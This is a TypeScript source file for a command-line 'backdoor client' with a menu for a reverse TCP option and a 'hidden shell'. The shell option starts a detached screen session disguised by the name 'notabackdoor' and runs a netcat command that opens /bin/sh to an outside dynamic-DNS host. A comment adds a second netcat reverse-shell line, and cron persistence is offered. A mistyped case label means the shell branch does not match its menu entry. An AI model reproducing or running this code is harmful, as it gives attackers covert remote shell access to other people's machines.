/* eslint-disable eqeqeq */
/* eslint-disable no-case-declarations */
import boxen from 'boxen';
import 'colors';
// eslint-disable-next-line @typescript-eslint/ban-ts-ignore
// @ts-ignore
import {select, confirm} from 'input';
import {exec, spawn} from 'child-process-promise';
import {ascii, windowClear, sleep} from './helpers';
// import child from 'child_process';
import 'yargs';

windowClear();
(async () => {
  let x = await ascii('WARNING!!!');
  console.log(x);
  x = await ascii(
    "DON'T MOVE THIS FILE\nAFTER USING THE CRONTAB\nOR IT'LL BREAK!!!"
  );
  console.log(x);

  await sleep(500);
  console.log(boxen("You've successfully installed a backdoor client!"));
  console.log(boxen("(now's a good time to pat yourself on the back)").yellow);
  await sleep(1500);
  console.log('Checking dependencies...');
  try {
    const e = await exec('which screen').catch(e => {});
    console.log('screen'.green);
  } catch (e) {
    if (e.stdout == '') throw Error("No 'screen' executable found");
    console.log(boxen('ERROR!!!').red);
    console.error(e);
  }
  let exit = false;
  while (!exit) {
    const res: string = await select(
      "So, Mr. Hackerman, what's on the agenda?",
      [
        'Websocket reverse TCP',
        'Create Hidden Shell (remote access v1)',
        'Exit',
      ]
    );
    switch (res) {
      case 'Exit':
        exit = true;
        console.log(await ascii('byee !!!'));
        await sleep(1500);
        windowClear();
        return;
      case 'Create Hidden Shell (remote asccess v1)':
        try {
          const {stdout} = await exec('screen -ls');
        } catch (e) {
          if (e.stdout.includes('No Sockets found')) {
            //
          } else {
            if (/notabackdoor/g.exec(e.stdout)) {
              console.log(boxen('A shell has already been made! Skipping...'));
              continue;
            } else {
              console.log(boxen('ERROR!!!').red);
              console.error(e);
            }
          }
        }
        const daemon = await confirm('Add this to cron?', {default: false});
        // nc localhost 5555 < myfifo | /bin/bash -s "fish; exit" -i > myfifo 2>&1
        console.log(boxen('Making a daemonised screen...'));
        await exec('screen -dmS notabackdoor');
        await exec('screen -X "nc jabster28.myddns.me -e /bin/sh"');
        console.log(boxen('Done!', {padding: 1}).green);
        break;
      default:
        windowClear();
        break;
    }
  }
})();
